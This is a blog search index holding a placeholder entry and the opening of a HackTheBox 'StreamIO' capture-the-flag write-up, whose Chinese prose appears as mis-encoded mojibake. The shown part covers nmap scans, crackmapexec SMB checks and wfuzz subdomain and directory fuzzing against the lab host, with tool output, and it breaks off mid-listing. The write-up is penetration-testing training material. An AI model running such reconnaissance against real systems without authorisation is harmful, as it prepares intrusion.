<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>test</title>
      <link href="/2024/01/09/test/"/>
      <url>/2024/01/09/test/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>123123</p><p>123123</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>[hackthebox]StreamIO WriteUp</title>
      <link href="/2023/12/10/htbStreamIO/"/>
      <url>/2023/12/10/htbStreamIO/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>åœ¨ä»Šå¹´çš„9æœˆåº•ä¹‹å‰ï¼Œæˆ‘æ‹¿åˆ°äº†å‡ å®¶æ¯”è¾ƒå¿ƒä»ªçš„offerï¼Œäº’è”ç½‘å¤§å‚å®‰å…¨å²—å’Œä¹™æ–¹å®‰å…¨å²—çš†æœ‰ã€‚å›æƒ³è‡ªå·±ä»Šå¹´ä¸‹åŠå¹´çš„ç”Ÿæ´»ï¼Œè¿˜æ˜¯æ¯”è¾ƒå……å®çš„ã€‚ä¸€è¾¹å®ä¹ ï¼Œä¸€è¾¹å‡†å¤‡ç§‹æ‹›ï¼Œä¸€è¾¹åˆç ”ç©¶è‡ªå·±æ„Ÿå…´è¶£çš„å®‰å…¨æŠ€æœ¯ã€‚åœ¨æ‹¿åˆ°äº†ç§‹æ‹›offerçš„ä¸€ä¸ªæœˆåï¼Œæˆ‘å‘å®éªŒå®¤æ€»ç›‘æäº¤äº†ç¦»èŒç”³è¯·ã€‚ç¦»èŒçš„æœ€åä¸€æ™šï¼Œæˆ‘åœ¨æœ›äº¬SOHOè½¬äº†ä¸€åœˆï¼Œå¿½ç„¶å‘ç°è‡ªå·±å·²ç»å¾ˆèˆä¸å¾—è¿™é‡Œäº†ã€‚</p><p><a href="https://pic.imgdb.cn/item/6575bc30c458853aefce847a.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6575bc30c458853aefce847a.jpg"></a></p><p>æˆ‘èµ·åˆçš„æƒ³æ³•æ˜¯è§‰å¾—å›å­¦æ ¡èƒ½å¤Ÿæ›´è½»æ¾è‡ªç”±ä¸€ç‚¹ï¼Œæƒ³å­¦ä»€ä¹ˆå°±å­¦ä»€ä¹ˆã€‚ä½†æ˜¯å›åˆ°å­¦æ ¡ä¹‹åçš„ä¸€ä¸ªå¤šæœˆé‡Œï¼Œæˆ‘å‡ ä¹å¤©å¤©éƒ½åœ¨æ‘†çƒ‚ï¼Œæ¯å¤©ä¸æ˜¯åˆ·åˆ·bç«™å°±æ˜¯ç©ç©æ¸¸æˆï¼Œå®Œå…¨æä¸èµ·å­¦ä¹ çš„å¿µå¤´ï¼Œä¹‹å‰æƒ³å¥½çš„è®¡åˆ’ä¹Ÿå…¨éƒ¨è½ç©ºã€‚ç›´åˆ°å‰äº›å¤©ï¼Œçœ‹åˆ°äº†Fakerå¤ºå† ã€‚</p><p>æˆ‘å¤§çº¦æ˜¯ä»S6å¼€å§‹å…³æ³¨è‹±é›„è”ç›Ÿèµ›äº‹çš„ã€‚åœ¨æˆ‘åˆšåˆšè§‚çœ‹è‹±é›„è”ç›Ÿæ¯”èµ›çš„æ—¶å€™ï¼ŒFakerå°±å·²ç»æ˜¯å½“ä¹‹æ— æ„§çš„GOATäº†ã€‚æˆ‘å¯¹Fakeræœ€åˆçš„å°è±¡æ˜¯è§‰å¾—ä»–ä¸ªäººå®åŠ›å¾ˆå¼ºï¼Œå…‰æ˜¯åœ¨ä¸­è·¯ç«™ç€å°±å·²ç»è®©äººæ„Ÿè§‰è„ŠèƒŒå‘å‡‰äº†ã€‚ä½†æ˜¯æˆ‘å´å¹¶ä¸æ˜¯ä»S6ï¼Œä¹Ÿå°±æ˜¯Fakeræˆä¸ºä¸‰å† ç‹çš„æ—¶å€™å¼€å§‹å–œæ¬¢Fakerçš„ã€‚æˆ‘æœ€å¼€å§‹å–œæ¬¢Fakerçš„æ—¶å€™ï¼Œæ˜¯åœ¨å»å¹´å…¨çƒæ€»å†³èµ›åŠå†³èµ›ï¼ŒT1å¯¹é˜µJDGçš„æ—¶å€™ã€‚æˆ‘è®°å¾—å½“æ—¶æ˜¯ç¬¬å››å±€ï¼ŒFakeræ“åˆ€çš„æ²™çš‡åœ¨è¿™ä¸€å±€é‡Œå‘æŒ¥éå¸¸äº®çœ¼ã€‚å°è±¡å¾ˆæ·±çš„ä¸€æ³¢æ˜¯Fakeråœ¨JDGè“åŒºæœæ–­é—ªç°è¿‡å¢™èµ¶è·¯ï¼Œç„¶åå¤§æ‹›æ¨å›ä¸¤äººï¼Œä»é‚£ä¸€åˆ»èµ·ï¼Œè¿™åœºæ¯”èµ›å¯¹äºJDGæ¥è¯´å·²ç»æ¸æ¸èµ°è¿œäº†ã€‚ä½†è¿™ä¸€æ³¢ä¹Ÿåªèƒ½è¯´æ˜Fakeræ˜¯ä¸€ä¸ªå¾ˆæœæ–­ã€é¢å¯¹æœºä¼šæ•¢äºå¤§èƒ†å°è¯•çš„é€‰æ‰‹ï¼ŒçœŸæ­£è®©æˆ‘æ„Ÿåˆ°åŠ¨å®¹çš„æ˜¯åœ¨åé¢ä¸­è·¯çš„ä¸€æ³¢å›¢æˆ˜ï¼ŒFakeræ¼‚ç§»+å¤§æ‹›æ¨åˆ°æ•Œæ–¹å››ä¸ªäººçš„é‚£ä¸€æ³¢ã€‚é‚£ä¸€æ³¢æ‰“å®Œä¹‹åï¼Œé•œå¤´ç»™äº†Fakerä¸€ä¸ªç‰¹å†™ï¼Œæˆ‘çœ‹åˆ°Fakeræ»¡å«ç¬‘æ„çš„çœ¼ç›é‡Œå‡ºç°äº†ä¸€æ»´çœ¼æ³ªã€‚</p><p><a href="https://pic.imgdb.cn/item/65760ea0c458853aef530ad8.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760ea0c458853aef530ad8.jpg"></a></p><p>é‚£ä¸€åˆ»ï¼Œæˆ‘æ·±æ·±åœ°è¢«Fakerçš„ä¸ªäººé­…åŠ›æ‰€æŠ˜æœã€‚é‚£ä¸ªæ—¶å€™è·ç¦»Fakerç¬¬ä¸€æ¬¡ç™»ä¸Šèµ›åœºå·²ç»è¿‡å»å¾ˆå¤šå¹´äº†ï¼Œä½†æ˜¯Fakerå¯¹äºè‹±é›„è”ç›Ÿçš„çƒ­çˆ±å´ä»æœªå‡å¼±ã€‚å³ä½¿å¾ˆå¤šäººè§‰å¾—ä»–å·²ç»è€äº†ï¼Œå·²ç»å®Œå…¨æ²¡æœ‰åŠæ³•è·Ÿå¹´è½»äººå»æ‹¼æ“ä½œäº†ï¼Œä½†æ˜¯ä»–ä¾ç„¶å‡­å€Ÿè‡ªå·±çš„åŠªåŠ›ç«™åœ¨æ¯”èµ›çš„èˆå°ä¸Šå¹¶æ‰“å‡ºå‡ºè‰²çš„è¡¨ç°ã€‚å› æ­¤å³ä½¿å»å¹´T1å†³èµ›è¾“ç»™äº†DRXï¼Œæˆ‘ä¹Ÿå¹¶æœªå¯¹Fakerçš„å–œçˆ±å‡å°‘åŠåˆ†ï¼Œå› ä¸ºæˆ‘ç›¸ä¿¡åƒä»–è¿™æ ·çš„äººï¼Œæ˜¯ä¸€å®šä¼šå†å¾—åˆ°ä¸€ä¸ªå† å†›çš„ã€‚</p><p>åªæ˜¯å‘½è¿ä¼¼ä¹æ€»æ˜¯å–œæ¬¢æ‰å¼„äººï¼Œå®ƒåœ¨è®©ä¸€ä¸ªäººæˆåŠŸä¹‹å‰ï¼Œæ€»æ˜¯è¦å…ˆè®©è¿™ä¸ªäººåƒç‚¹è‹¦å¤´ã€‚åœ¨ T1 æ‹¿åˆ°äº†ä¸–ç•Œèµ›äºšå†›ä¹‹åï¼Œå‘½è¿åˆé€ç»™äº†è¿™æ”¯é˜Ÿä¼ä¸¤æ¬¡äºšå†›ï¼ŒT1ä¹Ÿè¢«æˆç§°ä¸ºå¤§æ»¡äºšé˜Ÿä¼ã€‚åœ¨ä»Šå¹´7æœˆä»½çš„æ—¶å€™ï¼ŒFakerå› ä¸ºæ‰‹ä¼¤æŠ˜ç£¨ï¼Œä¸‹åœºä¼‘æ¯äº†ä¸€ä¸ªæœˆã€‚åœ¨è¿™ä¸€ä¸ªæœˆçš„æ—¶é—´é‡Œï¼ŒT1æ‰“äº†8ä¸ªBO3åªèµ¢äº†1æŠŠã€‚è¯´å®è¯ï¼Œå½“æ—¶çœ‹åˆ°è¿™ä¸ªæˆ˜ç»©çš„æ—¶å€™ï¼Œæˆ‘å°±å¯¹äºä»Šå¹´T1èƒ½å¤Ÿå†æ‹¿åˆ°ä¸€ä¸ªå† å†›ä¸å†æŠ±æœ‰ä»»ä½•ä¿¡å¿ƒäº†ã€‚ä½†æ˜¯Fakerå›æ¥ä¹‹åï¼Œåˆå¸¦é¢†4ä¸ªé˜Ÿå‹æˆåŠŸæ€åˆ°å¤å­£èµ›å†³èµ›ï¼Œç„¶ååˆæ‹¿äº†ä¸€ä¸ªäºšå†›â€¦â€¦è™½è¯´ä¸ä¹‹å‰çš„æˆ˜ç»©ç›¸æ¯”äºšå†›ä¹Ÿå·²ç»å¯ä»¥äº†ï¼Œä½†æ˜¯æˆ‘ä¹Ÿå¹¶ä¸è§‰å¾—ä»Šå¹´Fakerèƒ½å¤Ÿæ‹¿åˆ°å† å†›ã€‚å› ä¸ºå»å¹´ä¸€è·¯æ‰€å‘æŠ«é¡éƒ½æ²¡æœ‰æ‹¿åˆ°å† å†›ï¼Œæ›´ä½•å†µä»Šå¹´å‘¢ï¼Ÿè€Œä¸–ç•Œèµ›åˆæœŸT1çš„è¡¨ç°ä¼¼ä¹ä¹Ÿå°è¯äº†æˆ‘çš„æƒ³æ³•ï¼Œæ¯”å¦‚T1ç¬¬ä¸€å±€å¯¹é˜µTLéƒ½å·®ç‚¹ç¿»è½¦ï¼Œç¢°åˆ°Gengåˆè¾“äº†ä¸€å±€ã€‚ç„¶åæˆ‘å°±æ˜¯æŠ±ç€è¿™æ ·çœ‹è¡°çš„å¿ƒæ€ï¼Œçœ‹ç€Fakerå¸¦ç€4ä¸ªé˜Ÿå‹ä¸€è·¯è¿‡äº”å…³æ–©å…­å°†ï¼Œä»¥å¯¹ä½ LPLèµ›åŒº 11-1çš„è±ªåæˆ˜ç»©æ‹¿åˆ°äº†ä¸–ç•Œèµ›çš„å† å†›ã€‚</p><p>çœ‹åˆ°Fakeræ‹¿åˆ°äº†ä»–çš„ç¬¬å››å† ï¼Œæˆ‘æ˜¯æ‰“å¿ƒåº•é‡Œä½©æœå’Œé«˜å…´çš„ï¼Œä½†æ˜¯é«˜å…´ä¹‹ä½™åˆä¼šæƒ³åˆ°è‡ªå·±ã€‚è¿™æ®µæ—¶é—´æˆ‘ä¸€ç›´åœ¨é—®è‡ªå·±å¯ä¸å¯ä»¥åšåˆ°åƒFakerè¿™æ ·ï¼Œå¯¹äºè‡ªå·±çƒ­çˆ±çš„äº‹ä¸šæ•°åå¹´å¦‚ä¸€æ—¥çš„åšæŒä¸‹å»ã€‚Fakerä»S6ä¹‹åçš„æ•…äº‹ä¼¼ä¹åªæ˜¯åœ¨å‘Šè¯‰æˆ‘ä»¬ä¸€ä»¶äº‹ï¼Œé‚£å°±æ˜¯ç”¨åå¹´çš„æ—¶é—´åšæŒä¸æ‡ˆçš„å»åšä¸€ä»¶äº‹ï¼Œæ¢¦æƒ³æ‰æœ‰å¯èƒ½æˆçœŸã€‚åœ¨æ˜ç™½äº†è¿™ä¸€ç‚¹ä¹‹åï¼Œæˆ‘å¼€å§‹æ‰“èµ·ç²¾ç¥ã€‚æˆ‘å¸Œæœ›è‡ªå·±å¯ä»¥åšåˆ°åƒFakeré‚£æ ·ï¼Œä¿æŒè°¦é€Šï¼Œå¹¶ä¸”å¯¹äºè‡ªå·±çƒ­çˆ±çš„äº‹æƒ…å¯ä»¥å…¨åŠ›ä»¥èµ´åœ°å»åšã€‚</p><p>å› æ­¤æœ€è¿‘æˆ‘åˆæœ‰äº†å­¦ä¹ çš„åŠ¨åŠ›ï¼Œè¿™äº›å¤©ä¹Ÿæ˜¯æŒ‘äº†ä¸€äº›HTBçš„é¶æœºæ‰“äº†æ‰“ï¼Œæƒ³è®©è‡ªå·±çš„æ‰‹æ„Ÿæ¢å¤èµ·æ¥ã€‚æ¥ä¸‹æ¥çš„æ–‡ç« å°±æ˜¯å¯¹æˆ‘åœ¨æ‰“StreamIOè¿™å°é¶æœºçš„æ—¶å€™æ‰€æƒ³åˆ°çš„ä¸€äº›æ€è·¯å’Œé‡‡ç”¨çš„æ–¹æ³•åšä¸€ä¸ªè®°å½•ï¼Œå°½å¯èƒ½è¯¦ç»†å§ã€‚</p><h2 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h2><p>å› ä¸ºé¶åœºæ¯”è¾ƒå¤æ‚ï¼Œä¸ºäº†ä½¿å¾—ç½‘ç»œå°½é‡ç¨³å®šï¼Œæˆ‘ä»¬åœ¨è¿æ¥VPNçš„æ—¶å€™å¯ä»¥é€šè¿‡ä»£ç†æœåŠ¡å™¨è¿æ¥ã€‚å‘.ovpnæ–‡ä»¶ä¸­æ·»åŠ å¦‚ä¸‹é…ç½®ï¼š</p><p><a href="https://pic.imgdb.cn/item/65760eb0c458853aef5321be.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760eb0c458853aef5321be.jpg"></a></p><p>å…¶ä¸­192.168.135.1æ˜¯æˆ‘çš„ä»£ç†æœåŠ¡å™¨çš„IPï¼Œ7890æ˜¯ä»£ç†ç«¯å£ï¼Œä½ éœ€è¦æ”¹æˆä½ è‡ªå·±çš„ã€‚å¦å¤–OpenVPNçš„http-proxyå¿…é¡»ä½¿ç”¨TCPåè®®ã€‚é€šè¿‡ä»£ç†è¿æ¥VPNï¼Œé€Ÿåº¦è¿˜æ˜¯æ¯”è¾ƒå¿«çš„ï¼š</p><p><a href="https://pic.imgdb.cn/item/65760ebac458853aef53343a.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760ebac458853aef53343a.jpg"></a></p><p>æ¥ä¸‹æ¥å¼€å§‹æ‰“é¶ï¼Œé¦–å…ˆæ‰§è¡Œ<code>nmap -sT -p- --min-rate 5000 -oA nmapscan/ports 10.10.11.158</code>çœ‹çœ‹å¼€æ”¾çš„ç«¯å£ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.94SVN scan initiated Fri Dec  8 00:36:44 2023 as: nmap -sT -p- --min-rate 5000 -oA nmapscan/ports 10.10.11.158</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.158</span><br><span class="line">Host is up (0.28s latency).</span><br><span class="line">Not shown: 65517 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">53/tcp    open  domain</span><br><span class="line">80/tcp    open  http</span><br><span class="line">88/tcp    open  kerberos-sec</span><br><span class="line">135/tcp   open  msrpc</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">389/tcp   open  ldap</span><br><span class="line">443/tcp   open  https</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">464/tcp   open  kpasswd5</span><br><span class="line">593/tcp   open  http-rpc-epmap</span><br><span class="line">636/tcp   open  ldapssl</span><br><span class="line">5985/tcp  open  wsman</span><br><span class="line">9389/tcp  open  adws</span><br><span class="line">49667/tcp open  unknown</span><br><span class="line">49673/tcp open  unknown</span><br><span class="line">49674/tcp open  unknown</span><br><span class="line">49705/tcp open  unknown</span><br><span class="line">51260/tcp open  unknown</span><br><span class="line"></span><br><span class="line"><span class="comment"># Nmap done at Fri Dec  8 00:38:18 2023 -- 1 IP address (1 host up) scanned in 93.30 seconds</span></span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥è¿›è¡Œè¯¦ç»†ç«¯å£æ‰«æï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -sV -sC -O -p 53,80,88,135,139,389,443,445,464,593,636,5985,9389,49667,49673,49674,49705,51260 --min-rate 5000 -oA nmapscan/details 10.10.11.158</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.158</span><br><span class="line">Host is up (0.38s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Simple DNS Plus</span><br><span class="line">80/tcp    open  http          Microsoft IIS httpd 10.0</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-title: IIS Windows Server</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-12-08 12:44:22Z)</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)</span><br><span class="line">443/tcp   open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2023-12-08T12:46:06+00:00; +7h00m00s from scanner time.</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">| tls-alpn: </span><br><span class="line">|_  http/1.1</span><br><span class="line">| ssl-cert: Subject: commonName=streamIO/countryName=EU</span><br><span class="line">| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb</span><br><span class="line">| Not valid before: 2022-02-22T07:03:28</span><br><span class="line">|_Not valid after:  2022-03-24T07:03:28</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line">49667/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49674/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49705/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">51260/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running (JUST GUESSING): Microsoft Windows 2019 (89%)</span><br><span class="line">Aggressive OS guesses: Microsoft Windows Server 2019 (89%)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="built_in">test</span> conditions non-ideal).</span><br><span class="line">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s</span><br><span class="line">| smb2-time: </span><br><span class="line">|   <span class="built_in">date</span>: 2023-12-08T12:45:31</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="comment"># Nmap done at Fri Dec  8 00:46:13 2023 -- 1 IP address (1 host up) scanned in 119.55 seconds</span></span><br></pre></td></tr></table></figure><p>é€šè¿‡æ‰«æä¿¡æ¯ï¼Œå¯ä»¥åˆ¤æ–­è¿™æ˜¯ä¸€å°DCã€‚æ¥ç€å°†<code>streamio.htb</code>å’Œ<code>watch.streamio.htb</code>å†™å…¥åˆ°hostsã€‚å› ä¸ºå¼€æ”¾äº†139å’Œ445ç«¯å£ï¼Œå°è¯•smbåŒ¿åè¿æ¥ï¼š</p><p><a href="https://pic.imgdb.cn/item/65760ec7c458853aef535078.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760ec7c458853aef535078.jpg"></a></p><p>æ‰§è¡Œ<code>crackmapexec smb 10.10.11.158</code>å¯ä»¥æ‰«åˆ°ä¸€å°æœºå­ï¼Œå°†<code>dc.streamio.htb</code>ä¹Ÿæ·»åŠ è¿›hostsï¼š</p><p><a href="https://pic.imgdb.cn/item/65760ed3c458853aef536a2a.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760ed3c458853aef536a2a.jpg"></a></p><p>æ¥ä¸‹æ¥å°±æ‰«ä¸€ä¸‹å­åŸŸåå§ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H <span class="string">&quot;HOST: FUZZ.streamio.htb&quot;</span> -u https://streamio.htb/ --hw 24 --hc 400</span><br><span class="line"> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="string">&#x27;s documentation for more information.</span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Target: https://streamio.htb/</span></span><br><span class="line"><span class="string">Total requests: 19966</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">=====================================================================</span></span><br><span class="line"><span class="string">ID           Response   Lines    Word       Chars       Payload                                                                                                                   </span></span><br><span class="line"><span class="string">=====================================================================</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">000002268:   200        78 L     245 W      2829 Ch     &quot;watch - watch&quot;                                                                                                           </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Total time: 240.1962</span></span><br><span class="line"><span class="string">Processed Requests: 19966</span></span><br><span class="line"><span class="string">Filtered Requests: 19965</span></span><br><span class="line"><span class="string">Requests/sec.: 83.12368</span></span><br></pre></td></tr></table></figure><p>æ²¡æœ‰æ”¶è·ï¼Œåªæ‰«åˆ°ä¸€ä¸ªå·²æœ‰çš„watch.streamio.htbã€‚æ¥ä¸‹æ¥æˆ‘ä»¬è®¿é—®ä¸€ä¸‹è¿™å°ä¸»æœºéƒ¨ç½²çš„WebæœåŠ¡ï¼š</p><p><a href="https://pic.imgdb.cn/item/65760edec458853aef537a1d.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760edec458853aef537a1d.jpg"></a></p><p>80ç«¯å£æ˜¯ä¸€ä¸ªå¾ˆæ™®é€šçš„IIS Serverçš„æ¬¢è¿ç•Œé¢ï¼Œæ²¡ä»€ä¹ˆå€¼å¾—å…³æ³¨çš„ç‚¹ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬è®¿é—®ä¸€ä¸‹443ç«¯å£ï¼Œä»¥ä¸‹æ˜¯<a href="https://streamio.htbçš„ç•Œé¢ï¼š">https://streamio.htbçš„ç•Œé¢ï¼š</a></p><p><a href="https://pic.imgdb.cn/item/65760eeac458853aef5388e3.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760eeac458853aef5388e3.jpg"></a></p><p>å°è¯•æ³¨å†Œç™»å½•ï¼Œæ˜¾ç¤ºæ³¨å†ŒæˆåŠŸï¼Œä½†æ˜¯ç™»å½•å´ç™»å½•ä¸ä¸Šï¼Œsqlmapæ‰«äº†ä¹Ÿæ²¡ä»€ä¹ˆå‘ç°ã€‚å¯¹å…¶ä»–åœ°æ–¹è¿›è¡Œæ£€æŸ¥ï¼Œä¹Ÿæ²¡æœ‰å‘ç°å¯ç–‘çš„ç‚¹ã€‚æ¥ä¸‹æ¥çœ‹çœ‹<a href="https://watch.streamio.htb/%EF%BC%9A">https://watch.streamio.htb/ï¼š</a></p><p><a href="https://pic.imgdb.cn/item/65760ef4c458853aef539eff.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760ef4c458853aef539eff.jpg"></a></p><p>åˆ†æä¹‹åæ²¡å¾—åˆ°å¯ä»¥åˆ©ç”¨çš„ç‚¹ã€‚é‚£æ¥ä¸‹æ¥å°±çˆ†ç ´ä¸€ä¸‹ç›®å½•å§ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span 